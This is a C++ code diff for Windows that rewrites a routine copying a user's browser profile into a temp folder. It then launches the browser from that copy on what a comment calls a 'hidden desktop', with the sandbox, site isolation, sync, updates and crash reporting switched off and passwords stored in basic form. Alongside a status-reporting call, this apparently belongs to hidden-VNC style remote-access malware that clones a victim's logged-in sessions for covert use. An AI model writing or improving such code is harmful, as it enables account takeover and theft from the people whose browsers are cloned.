@@ -1148,24 +1148,41 @@ static bool delete_directory(wstring path) {
     return SHFileOperationW(&s) == 0;
 }
 
-static bool copy_directory(wstring src, wstring dst) {
+static void recursive_copy_internal(wstring src, wstring dst) {
+    SHCreateDirectoryExW(NULL, dst.c_str(), NULL);
+    wstring searchPath = src + L"\\*";
+    WIN32_FIND_DATAW fd;
+    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            wstring name = fd.cFileName;
+            if (name == L"." || name == L"..") continue;
+
+            // Skip heavy and unnecessary directories to speed up copying and launch
+            if (name == L"Cache" || name == L"Code Cache" || name == L"GPUCache" ||
+                name == L"Media Cache" || name == L"Service Worker" ||
+                name == L"Storage" || name == L"Extension Rules" ||
+                name == L"Safe Browsing" || name == L"Gr Shader Cache" ||
+                name == L"WebStorage" || name == L"Local Storage" ||
+                name == L"IndexedDB" || name == L"VideoDecodeStats") continue;
+
+            wstring subSrc = src + L"\\" + name;
+            wstring subDst = dst + L"\\" + name;
+
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                recursive_copy_internal(subSrc, subDst);
+            } else {
+                CopyFileW(subSrc.c_str(), subDst.c_str(), FALSE);
+            }
+        } while (FindNextFileW(hFind, &fd));
+        FindClose(hFind);
+    }
+}
+
+static bool copy_directory_optimized(wstring src, wstring dst) {
     delete_directory(dst);
-
-    if (src.back() != L'\\') src.push_back(L'\\');
-    src.push_back(L'*');
-    src.push_back(L'\0');
-    src.push_back(L'\0');
-
-    if (dst.back() == L'\\') dst.pop_back();
-    dst.push_back(L'\0');
-    dst.push_back(L'\0');
-
-    SHFILEOPSTRUCTW s = { 0 };
-    s.wFunc = FO_COPY;
-    s.pFrom = src.c_str();
-    s.pTo = dst.c_str();
-    s.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_SILENT | FOF_NOERRORUI;
-    return SHFileOperationW(&s) == 0;
+    recursive_copy_internal(src, dst);
+    return true;
 }
 
 static void launch_browser_thread(string browserType) {
@@ -1231,12 +1248,20 @@ static void launch_browser_thread(string browserType) {
 
     if (PathFileExistsW(profileSrc.c_str())) {
         send_status("Copying " + browserType + " profile to temp...");
-        copy_directory(profileSrc, profileDst);
+        copy_directory_optimized(profileSrc, profileDst);
     } else {
         send_status(browserType + " profile not found, starting with fresh profile.");
     }
 
-    wstring cmdLineStr = L"\"" + browserExe + L"\" --user-data-dir=\"" + profileDst + L"\" --no-first-run --no-default-browser-check --disable-gpu --no-sandbox";
+    // Optimization and GUI fixes (especially for Edge visibility on hidden desktops)
+    wstring cmdLineStr = L"\"" + browserExe + L"\" --user-data-dir=\"" + profileDst +
+                        L"\" --no-first-run --no-default-browser-check --disable-gpu --no-sandbox "
+                        L"--disable-features=IsolateOrigins,site-per-process,msEdgeStartupBoost,msEdgeCollections "
+                        L"--disable-dev-shm-usage --new-window --password-store=basic "
+                        L"--disable-component-update --disable-background-networking --disable-sync "
+                        L"--disable-breakpad --disable-renderer-backgrounding --disable-background-mode "
+                        L"--disable-hang-monitor --disable-prompt-on-repost --test-type";
+
     vector<wchar_t> cmdLine(cmdLineStr.begin(), cmdLineStr.end());
     cmdLine.push_back(L'\0');
 
